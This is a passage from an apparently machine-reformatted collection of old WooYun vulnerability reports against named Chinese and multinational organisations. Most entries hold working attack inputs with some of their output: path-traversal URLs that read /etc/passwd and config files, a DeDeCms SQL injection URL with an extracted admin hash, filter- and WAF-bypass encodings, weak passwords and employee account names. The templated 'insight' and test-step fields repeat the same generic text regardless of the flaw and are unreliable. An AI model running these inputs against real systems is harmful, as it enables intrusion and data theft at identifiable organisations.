**POC**: 一旦攻击成功，攻击者就能访问到该AP的配置页面。对于该已部署在某运营商内部的无线网络设备而言，厂商在设计时已经考虑了诸多的安全问题，比如在配置文件中默认管理员admin的密码就不再是明文或者简单的base64加密，而是采用了SHA256这样的强化算法。如下图中黑框部分所示，在passwd.conf配置文件中，“passwd=”后面不再是密码明文，而是经过SHA256运算过的SHA256 Hash值即常说的SHA256哈希值。但攻击者会下载修改后再重新将其一起封装成backup.tar配置文件，然后直接访问如下路径将备份数据文件恢复，如下图所示。

**绕过**: 过滤绕过

**修复**: 加强输入验证
---

---
### [wooyun-2016-0170213] 国药集团某系统越权访问系统日志+弱口令，弱口令导致session、协同办公、全公司通讯录泄露、VPN账号信息等
**厂商**: 国药集团 | **年份**: 2016 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: oa系统配置不当：http://oa.sinopharm.com/用友协同办公系统过低，导致可以爆破，得到不少弱口令：密码：123456账号：zhangyu	zhangying	chenfang		zhangyun		zhangying	liuyu		zhoujing虽然性能监控后台不能用默认密码登陆，但仍然可越权查看系统登陆日志，泄露session信息http://oa.sinopharm.com/seeyon//logs/login.log下面测试了3个账号，分属不同部门，含协同办公文件、员工通讯录等敏感信息：最后一个比较账号泄露的信息就敏感多了这里说好的关闭旧oa系统呢，怎么我还可以登陆？就去看了下新的oa系统，做了登陆验证：但任然存在日志泄露问题http://oa.cnbg.com.cn/seeyon//logs/login.log而且这里的性能监管后台居然还是默认口令，直接登陆成

**POC**: oa系统配置不当：http://oa.sinopharm.com/用友协同办公系统过低，导致可以爆破，得到不少弱口令：密码：123456账号：zhangyu	zhangying	chenfang		zhangyun		zhangying	liuyu		zhoujing虽然性能监控后台不能用默认密码登陆，但仍然可越权查看系统登陆日志，泄露session信息http://oa.sinopharm.com/seeyon//logs/login.log下面测试了3个账号，分属不同部门，含协同办公文件、员工通讯录等敏感信息：最后一个比较账号泄露的信息就敏感多了这里说好的关闭旧oa系统呢，怎么我还可以登陆

**绕过**: 直接利用

**修复**: 望修复
---

---
### [wooyun-2012-09961] 金山游戏目录遍历
**厂商**: 金山软件集团 | **年份**: 2012 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://jxworld.kingsoftgames.com/2012/http://song.kingsoftgames.com/post/info/http://mmo.kingsoftgames.com/product/webgame/http://9yin.kingsoftgames.com/post/

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 禁止列目录
---

---
### [wooyun-2015-099453] 联想thinkpad论坛运维不当导致数据库泄露影响30W用户
**厂商**: 联想 | **年份**: 2015 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 论坛程序数据库和程序可以下载！http://lenovobbs.lcf5.lenovo.com.cn/test.php 列出文件夹的文件下载2个zip后发现以下问题

**POC**: http://lenovobbs.lcf5.lenovo.com.cn/test.php 列出文件夹的文件下载2个zip后发现以下问题

**绕过**: 直接利用

**修复**: 你们更专业
---

---
### [wooyun-2012-04903] 联想某分站权限绕过，遍历目录漏洞
**厂商**: 联想 | **年份**: 2012 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 认证接口

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: web应用通过SAP遍历目录，绕过账户登录限制，访问内部信息系统。

**POC**: http://ec1.lenovo.com.cn/home/eppcsr/ecall/jsp/customerhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/upload.jsphttp://ec1.lenovo.com.cn/home/eppcsr/ecall/jsp/customer/http://ec1.lenovo.com.cn/wsnavigator/jsps/

**绕过**: 过滤绕过

**修复**: 联系第三方应用厂商
---

---
### [wooyun-2015-0111287] 同花顺某台服务器任意文件读取
**厂商**: 同花顺 | **年份**: 2015 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 需要使用一些发请求的工具，不会忽略../的http://125.93.53.228/../../../../../../../../../../../../../../../../../etc/hosts# Do not remove the following line, or various programs# that require network functionality will fail.127.0.0.1	hz-zx-linux localhost.localdomain localhost60.12.139.226   deliver.10jqka.com.cn::1		localhost6.localdomain6 localhost6http://125.93.53.228/../../../../../../../../../../../../../../../.

**POC**: 见详细

**绕过**: 直接利用

**修复**: 李劼杰的博客http://www.lijiejie.com/python-django-directory-traversal/
---

---
### [wooyun-2016-0170378] 巨人网络某系统修复不当造成敏感信息泄漏
**厂商**: 巨人网络 | **年份**: 2016 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 目录遍历未修复http://event.ztgame.com/tools/cloud-answer-file通过该地址我又发现了这个http://222.73.196.11/http://222.73.196.11/ztrcloud-openstack-ceph.repo

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 关闭目录浏览
---

---
### [wooyun-2015-0119344] 惠普某站点任意文件下载可获取源代码
**厂商**: 惠普 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 任意文件下载：http://webware.hp.com/slm/orangePortal/downloadFile?filename=/index.jsphttp://webware.hp.com/slm/orangePortal/downloadFile?filename=/WEB-INF/web.xml通过查看url映射，可以获取部分源代码。

**POC**: JSP测试页：http://webware.hp.com/testJSP<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%><%// do not catch anything on purpose.try{java.net.URL url = new java.net.URL("http://www8.hp.com/");System.getProperties().put("http.proxyHost", "web-proxy.austin.hp.com");Syste

**绕过**: 直接利用

**修复**: 限制可下载的文件
---

---
### [wooyun-2014-080522] 某省机场管理集团公司备份文件下载(2G敏感数据压缩包泄露)
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 本地下载的备份文件已删除

**POC**: http://www.lnairport.com/web.rar<

**绕过**: 直接利用

**修复**: 你懂的
---

---
### [wooyun-2014-080792] 杰士邦中国sql注射and目录遍历
**厂商**: 杰士邦中国 | **年份**: 2014 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 后台管理

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.jissbon.com/plus/recommend.php?action=&aid=1&_FILES[type][tmp_name]=\%27%20%20or%20mid=@%60\%27%60%20/*!50000union*//*!50000select*/1,2,3,%28select%20CONCAT%280x7c,userid,0x7c,pwd%29+from+%60%23@__admin%60%20limit+0,1%29,5,6,7,8,9%23@%60\%27%60+&_FILES[type][name]=1.jpg&_FILES[type][type]=application/octet-stream&_FILES[type][size]=6878用的是DeDeCms的程序。 还没有打补丁。  直接爆出了管理员用户名和密码。|admin:96277

**POC**: 用的是DeDeCms的程序。 还没有打补丁。  直接爆出了管理员用户名和密码。|admin:9627739dc34a7c300cbb|后台没找到。。也没有爆破http://www.jissbon.com/plus/ad_js.php?aid=1目录遍历：http://www.jissbon.com/include/http://www.jissbon.com/data/

**绕过**: 直接利用

**修复**: 安装最新发布的补丁，控制好目录权限。。男人的安全你来做，你的安全交给白帽子！
---

---
### [wooyun-2012-010075] 人民网某分站任意文件读取
**厂商**: 人民网 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 读取数据库连接文件

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 升级，修复
---

---
### [wooyun-2014-086382] 某科研管理系统平行权限漏洞(4)
**厂商**: e-plugger.com | **年份**: 2014 | **类型**: 非授权访问/权限绕过

**元思考**: 触发信号: 功能测试

**洞察**: 非授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别非授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 为了测试我们先注册个账号wooyun由于是未通过审核的用户，所以功能模块中找不到新增文件我们右键新标签页打开文件下载删掉url中的&@id$lt=0F12，可以看见每个文件对应一个id通过某种方法得知编辑文件的url为 /business/oa/annex.do?actionType=edit&bean.id=我们把上面那个文件的id加到url后面/business/oa/annex.do?actionType=edit&bean.id=ff8080813f2fed3d013f398f07de076d为了避免查水表，我们仅测试加个文件描述，然后保存

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 还是进行权限校验
---

---
### [wooyun-2014-079812] 某省卫生监督网任意文件下载
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 这个漏洞很常见，没什么，只是这段代码过滤的逻辑有点。。。。http://www.fjhi.gov.cn/templates/download.jsp?path=download.jsp什么都不说了，上代码：jsp和java环境不同，不能一个return完事

**POC**: 同上

**绕过**: 直接利用

**修复**: 后边的代码放到else中
---

---
### [wooyun-2015-0159075] 中国移动某系统绕过过滤防护继续任意文件读取可实现全站下载
**厂商**: 中国移动 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 无聊时，看大牛的漏洞，http://**.**.**.**/bugs/wooyun-2010-0149415然后试了一下，发现修复了。but……发现会把 ../ 置空利用....// 代替 ../利用..// 代替 /任意文件下载

**POC**: **.**.**.**/beapp/zh/index/login.jsp山东移动外勤通系统**.**.**.**/beapp/dow.download?filename=....//....//....//....//....//etc..//passwd读取配置文件web.xml读取/WEB-INF/faces-config.xml下载class文件反编译

**绕过**: 直接利用

**修复**: 严格过滤
---

---
### [wooyun-2015-095072] 疑似春秋航空某后台系统存在目录遍历（泄漏部分用户信息）
**厂商**: 春秋航空 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://180.153.27.10:8080/content/CSV/

**POC**: 证明是春秋的：1.csv 跟10.csv里面

**绕过**: 直接利用

**修复**: 目录权限问题
---

---
### [wooyun-2015-0142270] 湖南某银行主站存在任意文件读取漏洞导致敏感信息泄露
**厂商**: 湖南某银行 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 湖南宜章农商银行系统主站phpcms未升级，存在任意文件读取漏洞，导致敏感信息泄露。

**POC**: 银行主站地址：http://**.**.**.**/phpcms/看到银行的URL中包含phpcms，经过一番寻找发现该银行系统使用的是phpcmsV9版本，这个版本存在任意文件读取漏洞。读取数据库文件database.php：http://**.**.**.**/phpcms/index.php?m=search&c=index&a=public_get_suggest_keyword&url=asdf&q=../../phpsso_server/caches/configs/database.php主机名、数据库、用户名、密码都在这了。查看一些版本phpcms版本：http://**.**

**绕过**: 直接利用

**修复**: 升级！
---

---
### [wooyun-2015-0157874] 江西公共资源交易网存在目录遍历漏洞
**厂商**: 江西公共资源交易网 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://**.**.**.**/FileUpload/FCKFile/file/

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 屏蔽目录显示。
---

---
### [wooyun-2012-07583] 公安部某站点任意文件下载
**厂商**: 公安部 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 原始链接：http://www.cccf.net.cn/center/pages/download.jsp?path=uploads%5C2011%5C11%5C28%5C1133252150510.doc&name=%C5%E7%CB%AE%C3%F0%BB%F0%B2%FA%C6%B7.doc其中文件下载路径参数path没有对路径进行必要的限制！

**POC**: http://www.cccf.net.cn/center/pages/download.jsp?path=center/pages/download.jsp&name=download.jsphttp://www.cccf.net.cn/center/pages/download.jsp?path=center/toLogin.jsp&name=toLogin.jsp.........and so on!

**绕过**: 直接利用

**修复**: 对下载路径做必要的限制！
---

---
### [wooyun-2014-053831] 某通用型系统任意文件下载
**厂商**: Cncert | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 晚上无聊，翻了翻之前的漏洞，WooYun: 通用型程序漏洞导致多个政府网站沦陷看到该系统，随便找了几个例子，发现该系统存在任意文件下载漏洞

**POC**: inurl:web!getTitleGo.action （这里暂不提struts2的漏洞）随便找几个站点测试下载 /WEB-INF/web.xml 及  /WEB-INF/applicationContext.xml(数据库连接文件)http://www.jcjjjc.gov.cn/common/down.jsp?filepath=\WEB-INF\applicationContext.xml&filename=http://www.jcjjjc.gov.cn/common/down.jsp?filepath=\WEB-INF\web.xml&filename=http://www.jqlzw

**绕过**: 直接利用

**修复**: 大都为sa权限，如果数据库服务器是外网的话，是否可以……还是比较危险吧。
---

---
### [wooyun-2015-0158169] 安阳钢铁某重要平台oracle注入涉及11个库
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 功能测试

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 系统：http://**.**.**.**/漏洞地址：POST /UCMLWebServiceEntryForJs.aspx/ HTTP/1.1Host: **.**.**.**:8080Proxy-Connection: keep-aliveContent-Length: 563Accept: text/plain, */*; q=0.01Origin: http://**.**.**.**:8080X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36Content-Type: application/x-www-form-urlencod

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 过滤
---

---
### [wooyun-2015-0154545] 懒人听书服务配置不当（弱口令/多个分站信息泄漏/目录遍历）
**厂商**: lrts.me | **年份**: 2015 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 0x01 弱口令http://blog.lrts.me/wp-login.php作者：lizhuo/1234560x02 4个分站SVN信息泄漏http://36.250.78.77:3000/.svn/entrieshttp://assets.lrts.me/.svn/entrieshttp://d.lrts.me/.svn/entrieshttp://m.lrts.me/.svn/entries0x02 目录遍历泄漏资源http://soft.lrts.me/

**POC**: 如上

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-054134] 北京市投资促进局任意文件下载
**厂商**: 北京市投资促进局 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: www.investbeijing.gov.cn/file.do?fname=../index.jsp

**POC**: www.investbeijing.gov.cn/file.do?fname=../index.jsp

**绕过**: 直接利用

**修复**: 避免目录穿越
---

---
### [wooyun-2015-093318] 多个大型企业任意文件下载（可读取passwd）
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 防刷模式啊：以下都是未修复，比较大型的企业http://custom.ccb-life.com.cn:9080/web/common/getfile.jsp?p=..\\..\\..\\..\\etc\\passwd  建信人寿http://icc.21cp.com/web/common/getfile.jsp?p=..\\..\\..\\..\\etc\\passwd  中塑在线http://111.75.198.122/web/common/getfile.jsp?p=..\\..\\..\\..\\etc\\passwd 江西中小企业http://im.e-picc.com.cn/web/common/getfile.jsp?p=..\\..\\..\\..\\etc\\passwd  中国人保财险http://icc.occard.com.cn/web/common/getfile

**POC**: 例：http://icc.occard.com.cn/web/common/getfile.jsp?p=..\\..\\..\\..\\etc\\passwdroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-049024] 信游科技页游平台程序通用型任意文件下载可能导致大规模拖库（基于免费版）
**厂商**: 52xinyou.cn | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: WooYun: 信游科技页游平台程序通用型代码级后门账户(成功登录多个商业后台并可操纵订单和游戏)看了这个洞里面厂商的回复，似乎厂商不太理解一些问题。为了回复您的问题，我只能多挖一个漏洞来提交好在详细说明里面给您回复了。2014-01-15 15:28 | 信游科技页游(乌云厂商) 0这是源代码啊.他们技术自己发的吧.程序员是不是和公司闹变扭了.拿段测试代码就上来了.1.源代码是你们在官网提供的，http://52xinyou.cn/chanpin.htm 在这里面有一个“立即下载”，里面的超链接是http://52xinyou.cn/信游免费版.rar  我的网站结构和信息都是从这里来的2.你们程序员是不是有人离职？可能是某人离职前留下的后门账号。3.似乎厂商感觉新版要发布了，就有点忽略了在用的旧版、已传播开的免费版的安全问题了（看意思我理解是不打算修复，以后升级新版），但是目前在用的很

**POC**: 下面开始说下这个任意文件下载。信游免费版\xymfpt\平台\web\Api\download.ashxpublic void ProcessRequest(HttpContext context){DataManage.DownLoadManage down = new DataManage.DownLoadManage();down.FileDown(context);}信游免费版\xymfpt\平台\web\bin\DataManage.dllDataManage.DownLoadManage.FileDownpublic void FileDown(HttpContext contex

**绕过**: 直接利用

**修复**: 限制可下载的文件的目录
---

---
### [wooyun-2015-0136840] 央视网某分站任意文件读取
**厂商**: 中国网络电视台 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://wiki.ops.cntv.cn/s/zh_CN/3145/3/1.0/_/images/../WEB-INF/web.xml?央视网的wiki是confluence搭建的，我们一般用gitlab，话题跑偏了~~~既然是confluence，那么随便翻些重要文件，confluence-init.properties，这个文件可以看到confluence的home目录osuser.xml管理用户信息web.xml应用的配置路径

**POC**: confluence的home目录osuser.xml管理用户信息web.xml应用的配置路径

**绕过**: 直接利用

**修复**: 过滤
---

---
### [wooyun-2014-083211] 平安信托(平安官网)文件包含漏洞
**厂商**: trust.pingan.com | **年份**: 2014 | **类型**: 文件包含

**元思考**: 触发信号: 认证接口

**洞察**: 文件包含防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件包含相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 很多人发现此漏洞后一般就下载passwd，其实还有很多可以下载：http://trust.pingan.com/downLoad.shtml?fileurl=../../../../../../../../etc/sysconfig/network&filename=network网络配置文件http://trust.pingan.com/downLoad.shtml?fileurl=../../../../../../../../etc/group&filename=group用户组文件http://trust.pingan.com/downLoad.shtml?fileurl=../../../../../../../../etc/passwd&filename=passwd用户配置文件http://trust.pingan.com/downLoad.shtml?fileurl=../

**POC**: NETWORKING=yesNETWORKING_IPV6=yesHOSTNAME=cnsz031535GATEWAY=172.28.8.200--------------------------------------------------------------------------------------root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/dev/nulldaemon:x:2:2:daemon:/sbin:/dev/nulladm:x:3:4:adm:/var/adm:/dev/nulllp:x:4:7:lp:/var

**绕过**: 直接利用

**修复**: 过滤敏感字符
---

---
### [wooyun-2014-049526] 随笔记任意文件读取
**厂商**: 随笔记 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://file.suibiji.com/att?src=../etc/passwd注册一个号～任意读取文件～～

**POC**: 看到var/www了～～～好像还看到了什么什么～

**绕过**: 直接利用

**修复**: 补补
---

---
### [wooyun-2015-0162871] 中南民族大学某系统漏洞导致用于统一认证的ids(信息门户)沦陷，可获得最高权限
**厂商**: 中南民族大学 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 任意文件读取：http://**.**.**.**/epstar/servlet/RaqFileServer?action=open&fileName=/..//WEB-INF/config/swms.propertieshttp://**.**.**.**/epstar/servlet/RaqFileServer?action=open&fileName=/..//WEB-INF/config/client.properties其中用户名密码为base64编码，解开如下：ids.UserName=aWNl*****Rvcg==             // i****rids.Password=c2N****2U=                      //s*****e之后可以登陆**.**.**.**的后台Sun Java System Access Manager，内涵大量用户

**POC**: 还有传说中的教务管理系统

**绕过**: 编码绕过

**修复**: 改代码
---

---
### [wooyun-2015-0117597] 189.cn某业务任意文件下载
**厂商**: 189.cn | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://800.189.cn/file/download.do?file=../../../../../../../etc/passwdroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nolog

**POC**: DEVICE=eth0BOOTPROTO=dhcpONBOOT=yes

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-095398] 广东省某市食品药品管理局8000多条企业账号密码泄露
**厂商**: 广东省某市食品药品管理局 | **年份**: 2015 | **类型**: 用户资料大量泄漏

**元思考**: 触发信号: 认证接口

**洞察**: 用户资料大量泄漏防护不足，开发者信任前端输入

**测试流程**:
1. 识别用户资料大量泄漏相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 东莞市食品药品监督管理局http://dg.gdda.gov.cn/publicfiles///business/htmlfiles/fdadg/cmsmedia/document/doc47095.xls泄露企业账号密码就不说了，问题是账号排列整齐有序，密码统一都是一个。唉。。（谷歌搜到的）登录地址：http://219.135.157.142:9000/irpt/i/oem/grpslogin.jsp

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 。。
---

---
### [wooyun-2015-0163819] 四川大学主站文件读取漏洞
**厂商**: 四川大学信息管理中心 | **年份**: 2015 | **类型**: 应用配置错误

**元思考**: 触发信号: 功能测试

**洞察**: 应用配置错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别应用配置错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 访问http://www.scu.edu.cn/WEB-INF/web.xml很自然的被waf拦了不过访问http://www.scu.edu.cn/WEB-INF/applicationContext.xml时可能没这个规则就没有拦截嗯 本来就想这样了~不过临提交前尝试了一下结果将 / 编码一下就能读取web.xml了http://www.scu.edu.cn//WEB-INF%2fweb.xml具体利用参考~WooYun: 去哪儿任意文件读取（基本可重构该系统原工程）我是小菜比 我也不太会~

**POC**: 另外有一处站点存在目录遍历http://125.69.85.16/lsxk_pic/http://125.69.85.16/wForum/inc/http://125.69.85.16/wForum/documents/

**绕过**: 编码绕过

**修复**: 加强输入验证
---

---
### [wooyun-2010-01013] 完美时空遍历目录漏洞
**厂商**: 完美时空 | **年份**: 2010 | **类型**: 系统/服务补丁不及时

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务补丁不及时防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务补丁不及时相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: resin的一个老漏洞了.目录遍历./path/%3f.jsp竟然还发现了tar打包的程序 .也放在了web目录里.

**POC**: http://event6.wanmei.com/jsp/%3f.jsp目录向下继承一样可以读取.

**绕过**: 直接利用

**修复**: 升级resin.排查公司其他resin服务器.定期检查
---

---
### [wooyun-2014-081566] 社会科学文献出版社目录遍历泄露全部用户密码+服务器配置信息等等
**厂商**: ssap.com.cn | **年份**: 2014 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.按照往常习惯，饭后看看乌云，结果又一个已经像公众公开的漏洞中枪原漏洞ID:www.wooyun.org/bugs/wooyun-2014-0758532.我心想应该还有其他的，所以在原有的基础上继续挖，果然有以外收获啊！3.test.ssap.com.cn/admin/CEC_Login.htm后台登陆还是你们公司的，但是访问主页好像被劫持了？

**POC**: 1.目录遍历一大堆：随便上其中一些test.ssap.com.cn/config/test.ssap.com.cn/membertest.ssap.com.cn/temp/test.ssap.com.cn/pic/test.ssap.com.cn/data/test.ssap.com.cn/admin/sys/test.ssap.com.cn/admin/config/SiteConfig.xmltest.ssap.com.cn/admin/config/test.ssap.com.cn/api/test.ssap.com.cn/api/log.txt2.下面看图：放点重要的上来就行了主站测试

**绕过**: 直接利用

**修复**: 为什么没修复？觉得用户信息不重要吗？听说厂商有洞必给礼物？好像ipone6 plus挺好的，哈哈。。。。。。。。。。。。
---

---
### [wooyun-2011-01411] 网易论坛目录遍历。源码泄露。
**厂商**: 网易 | **年份**: 2011 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://bbs.163.com/

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 不用问了。。你们已经有多次这个漏洞了。
---

---
### [wooyun-2016-0208641] 搜狐一系列漏洞打包（项目源码/任意文件读取/心脏滴血等）
**厂商**: 搜狐 | **年份**: 2016 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 认证接口

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 一、Jenkins未授权访问http://220.181.26.165/jenkins/发现有点坏，不能登录，不能执行命令等，但是项目源码是可以访问的可查看的一些敏感信息，涉及一些子域名http://220.181.26.165/jenkins/job/video_audit_info/ws/pom.xml/*view*/http://220.181.26.165/jenkins/job/GoLang-56-synchronize-vrs/ws/pom.xml/*view*/http://220.181.26.165/jenkins/job/admin_tv_cleanCache/ws/clean_admin_cache.iml/*view*/http://220.181.26.165/jenkins/job/admin_tv_cleanCache/ws/pom.xmlhttp://220

**POC**: 三、SOHU DRM系统弱口令http://123.126.104.236:8888/弱口令：admin  admin也不知道干什么的，就未深入了。四、搜狐支付某站点存在心脏滴血漏洞https://123.125.123.242/ok，就到这里了，还望修复^_^

